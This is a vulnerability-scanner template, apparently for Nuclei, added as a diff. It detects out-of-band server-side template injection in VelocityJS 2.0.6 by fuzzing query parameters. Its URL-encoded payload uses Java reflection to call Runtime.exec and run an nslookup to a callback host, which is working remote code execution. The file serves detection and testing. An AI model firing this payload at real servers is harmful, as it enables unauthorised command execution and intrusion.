@@ -1,0 +1,38 @@
+id: velocityjs-oob
+
+info:
+  name: VelocityJS 2.0.6 - Out of Band Template Injection
+  author: 0xAwali,DhiyaneshDK
+  severity: high
+  reference:
+    - https://www.npmjs.com/package/velocityjs
+    - https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756
+  metadata:
+    verified: true
+  tags: ssti,dast,oast,oob
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - '%23set%28%24var%3D%27%27%29%23%23%0A%23set%28%24runtime%3D%24var.class.forName%28%27java.lang.Runtime%27%29%29%23%23%0A%23set%28%24character%3D%24var.class.forName%28%27java.lang.Character%27%29%29%23%23%0A%23set%28%24string%3D%24var.class.forName%28%27java.lang.String%27%29%29%23%23%0A%23set%28%24rce%3D%24runtime.getRuntime%28%29.exec%28%27nslookup%20-type%3DSRV%20{{interactsh-url}}%27%29%29%23%23%0A%24rce.waitFor%28%29%0A%23set%28%24output%3D%24rce.getInputStream%28%29%29%23%23%0A%23foreach%28%24i%20in%20%5B1..%24output.available%28%29%5D%29%24string.valueOf%28%24character.toChars%28%24output.read%28%29%29%29%23end'
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'dns')"
+          - "contains(interactsh_request,'srv')"
+        condition: and
+# digest: 4a0a00473045022077bc7688a1784b67e160945dc42a3d4d160fd96b6535a9d72e88b8d3263a8183022100eec432f2868ec673728e1821347b9121ab837b05818ddc2e69593fa74a00e12d:922c64590222798bb761d5b6d8e72950
